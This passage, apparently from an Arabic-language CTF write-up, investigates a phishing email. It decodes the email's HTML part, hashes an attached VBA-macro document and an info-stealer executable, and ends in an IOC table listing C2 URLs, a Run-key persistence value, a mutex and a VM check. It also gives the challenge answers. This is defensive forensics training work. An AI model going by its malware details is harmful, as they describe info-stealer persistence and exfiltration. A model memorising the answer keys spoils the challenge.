+<p>فاكر في أول الـ writeup لما ظهرلنا <code>text/html</code>؟ معرفناش نعمل بيه إيه — ما نجرب نفك الـ encoding ونفهم؟</p>
+<div class="highlight"><pre><span></span><code>python3 &lt;&lt; 'EOF'
+import email
+with open('challenge.eml', 'rb') as f:
+    msg = email.message_from_binary_file(f)
+for part in msg.walk():
+    if part.get_content_type() == 'text/html':
+        print(part.get_payload(decode=True).decode('utf-8', errors='ignore'))
+EOF
+</code></pre></div>
+<p>هيظهر كود HTML الميل كله وهتلاقي في آخره الـ PIN.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:695/0*vroGrjT-gI9IYdcL.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:695/0*vroGrjT-gI9IYdcL.png"></a></p>
+<p>Answer: <code>729314</code></p>
+<h2 id="q27-transaction-id">Q27 — Transaction ID</h2>
+<p>Question: What is the Transaction ID displayed?</p>
+<p>بعد ما سجّلنا بكل حاجة هيظهرلنا الـ Transaction ID.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:695/0*QRhAijFnKNpBCTN9.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:695/0*QRhAijFnKNpBCTN9.png"></a></p>
+<p>Answer: <code>TXN-8A3F-QZ91</code></p>
+<h2 id="q28-internal-reference-number">Q28 — Internal Reference Number</h2>
+<p>Question: What is the Internal Reference Number shown on the success page?</p>
+<p>Answer: <code>REF-DPHISH-2026-0042</code></p>
+<h2 id="phase-7-file-hashes">Phase 7 — File Hashes</h2>
+<h2 id="q29-sha256-of-vba-macro-file">Q29 — SHA256 of VBA Macro File</h2>
+<p>Question: What is the SHA256 hash of the attached file that contains a VBA macro?</p>
+<div class="highlight"><pre><span></span><code>sha256sum Policy_Update.doc
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:695/0*pFt7YosHF8ga-PiC.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:695/0*pFt7YosHF8ga-PiC.png"></a></p>
+<p>Answer: <code>2fed17ccf194e2b63734571b2a3b122363779ce920c20dc84798387de87a638</code></p>
+<h2 id="q30-sha256-of-info-stealer">Q30 — SHA256 of Info-Stealer</h2>
+<p>Question: What is the SHA256 hash of the compiled info-stealer malware hidden in the email?</p>
+<p>يقصد طبعاً الـ exe.</p>
+<div class="highlight"><pre><span></span><code>sha256sum Update_Tool.exe
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:695/0*0uyuTb44j2-XMJfT.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:695/0*0uyuTb44j2-XMJfT.png"></a></p>
+<p>Answer: <code>6b8f21832549f4a61e66dfd910196146e152a03f00ab0b2c11f06e7c7a01025e</code></p>
+<h2 id="ioc-report">خلاصة — IOC Report</h2>
+<div class="highlight"><pre><span></span><code>╔══════════════════════════════════════════════════════════╗
+║              DPhish Campaign — IOC Summary               ║
+╠══════════════════════════════════════════════════════════╣
+║ EMAIL                                                    ║
+║  Sender IP    : 185.199.42.13                            ║
+║  Mail Gateway : mail.evil.owndomain.online               ║
+║  Mail Client  : PyMailer 3.2.1                           ║
+║  Reply-To     : hr-support@evil.owndomain.online         ║
+║  SPF Result   : softfail                                 ║
+╠══════════════════════════════════════════════════════════╣
+║ PDF METADATA                                             ║
+║  Author       : dphish_admin                             ║
+║  Creator      : wkhtmltopdf 0.12.6                       ║
+║  Producer     : ReportLab v4.1                           ║
+║  Keywords     : CTF-2026-PHISH                           ║
+╠══════════════════════════════════════════════════════════╣
+║ NETWORK                                                  ║
+║  Macro C2     : http://evil.owndomain.online/api/collect ║
+║  EXE C2       : http://evil.owndomain.online/upload      ║
+╠══════════════════════════════════════════════════════════╣
+║ HOST                                                     ║
+║  Registry     : HKCU\...\CurrentVersion\Run              ║
+║  Value Name   : WindowsUpdateSvc                         ║
+║  Mutex        : Global\DPhishMutex2026                   ║
+║  VM Check     : vmtoolsd.exe                             ║
+╠══════════════════════════════════════════════════════════╣
+║ FILE HASHES                                              ║
+║  Policy_Update.doc  : 2fed17cc...a638                    ║
+║  Update_Tool.exe    : 6b8f2183...25e                     ║
+╚══════════════════════════════════════════════════════════╝
+</code></pre></div>
+<h2 id="investigation">ملاحظات للـ Investigation الحقيقي</h2>
+<p>في بعض الخطوات اللي ما استخدمناهاش — لو كنا بنعمل investigation حقيقي:</p>
+<p>Email Threading: لو في emails تانية من نفس المهاجم؟ نفس الـ campaign؟</p>
+<p>Lateral Movement Check: هل الإيميل اتبعت لناس تانيين في الشركة؟</p>
+<div class="highlight"><pre><span></span><code>grep -iE "^To:|^CC:" challenge.eml
+</code></pre></div>
+<p>Timestamp Analysis: التوقيت في الـ headers منطقي؟ الـ timezone في Received headers consistent؟</p>
+<p>BCC Detection: ممكن الإيميل اتبعت لعدد كبير من الناس في BCC.</p>
+<p>Threat Intelligence: التأكد من كل IP وURL ظهر معانا من الـ reputation بتاعته على الـ Threat Intel (VirusTotal, OTX AlienVault).</p>
+<p>Dynamic Analysis: احنا ما محتاجناهوش أوي، لأن الـ exe كان واضح مش obfuscated وكان كفاية الـ static analysis.</p>
+<blockquote>
+<p><em>وبس كده — إن أصبت فهو من عند الله، وإن أخطأت فهو من نفسي أو الشيطان.</em></p>
+</blockquote>
+</div>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="September 27, 2026 17:56:36 UTC">September 27, 2026</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden="">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://x.com/VampireXray" target="_blank" rel="noopener" title="x.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"></path></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/reem-khalid-818b83250/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"></path></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.youtube.com/@VampireXRay/playlists" target="_blank" rel="noopener" title="www.youtube.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M549.7 124.1c-6.2-23.7-24.8-42.3-48.3-48.6C458.9 64 288.1 64 288.1 64S117.3 64 74.7 75.5c-23.5 6.3-42 24.9-48.3 48.6C15 167 15 256.4 15 256.4s0 89.4 11.4 132.3c6.3 23.6 24.8 41.5 48.3 47.8C117.3 448 288.1 448 288.1 448s170.8 0 213.4-11.5c23.5-6.3 42-24.2 48.3-47.8 11.4-42.9 11.4-132.3 11.4-132.3s0-89.4-11.4-132.3zM232.2 337.6V175.2l142.7 81.2z"></path></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.top", "navigation.footer", "navigation.indexes", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../javascripts/bat-cursor.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
